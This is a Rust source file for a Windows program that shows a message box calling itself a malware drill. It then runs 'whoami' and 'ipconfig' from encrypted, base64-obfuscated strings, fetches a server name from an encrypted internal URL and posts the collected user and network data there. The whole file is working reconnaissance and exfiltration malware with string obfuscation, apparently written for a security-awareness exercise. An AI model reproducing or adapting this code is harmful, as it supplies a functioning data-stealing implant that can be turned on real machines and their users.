use reqwest;
use serde::Serialize;
use std::{process::Command};
use magic_crypt::{MagicCryptTrait, new_magic_crypt, MagicCrypt256};
//use std::ffi::CString;
//use user32::MessageBoxA;
//use winapi::um::winuser::{MB_OK, MB_ICONINFORMATION};
use windows::{core::*, Win32::UI::WindowsAndMessaging::*};

#[derive(Serialize)]
struct Whoami {
    whoami: String,
    ipconfig: String,
}

fn main() {
    /*let mut commands: Vec<&str> = vec![];
    commands.push("whoami");
    commands.push("ipconfig");
    for command in commands {
        let output = run_command(command);
        let _result = make_request(&output);
    }*/
    //let lp_text = CString::new("You executed a malware. But do NOT worry. It's a drill.").unwrap();
    //let lp_caption = CString::new("Warning").unwrap();
    unsafe {
        /*MessageBoxA(std::ptr::null_mut(), lp_text.as_ptr(), 
        lp_caption.as_ptr(), MB_ICONINFORMATION | MB_OK);*/
        MessageBoxA(None, s!("You executed a malware. But do NOT worry. It's a drill."), 
        s!("Warning"), MB_ICONINFORMATION | MB_OK);
    }
    let cryptor = new_magic_crypt!("AAABBCCCDDDEEE", 256);
    let output1 = run_command(&decrypt(&cryptor, "MPa/ngkRhP50Pkvrnc2V2A=="));  // whoami
    let output2 = run_command(&decrypt(&cryptor, "DvIk7Vgl7YXTDwtrU/Lbng=="));  // ipconfig
    let _result = make_command_request(&output1, &output2, &cryptor);
}

#[tokio::main]
async fn make_command_request(output1: &str, output2: &str, cryptor: &MagicCrypt256) -> reqwest::Result<()>{
    let data = Whoami {
        whoami: output1.to_string(),
        ipconfig: output2.to_string(),
    };
    let client = reqwest::Client::new();
    let domain_name = client.get(&decrypt(&cryptor, 
        "aNfzKgOgX2llD7DxfNxXTRvCJvaZhqvCNwnuKW4hvIYZit8xsONQHgxQXo/+1no7")).send().await?;  // http://10.0.2.15:8080/api/v4/domain
    let domain_name = domain_name.text().await?;
    let url = format!("http://{}:8080/api/v5/whoami", domain_name);
    let response = client.post(url).json(&data).send().await?;
    let _response_text = response.text().await?;
    Ok(())
    /*let result = reqwest::get("https://www.google.com/").await;
    match result {
        Ok(_) => {
            println!("Ok");
        },
        Err(_) => {
            println!("Something unexpected happened");
        },
    }*/
    //print!("{:?}", result);
}

fn run_command(command: &str) -> String {
    let output = Command::new(command).output().unwrap();
    //println!("{}", String::from_utf8_lossy(&output.stdout));
    String::from_utf8_lossy(&output.stdout).to_string()
}

fn decrypt(cryptor: &MagicCrypt256, encrypted: &str) -> String {
    // cryptor.encrypt_str_to_base64(encrypted)
    cryptor.decrypt_base64_to_string(encrypted).unwrap()
}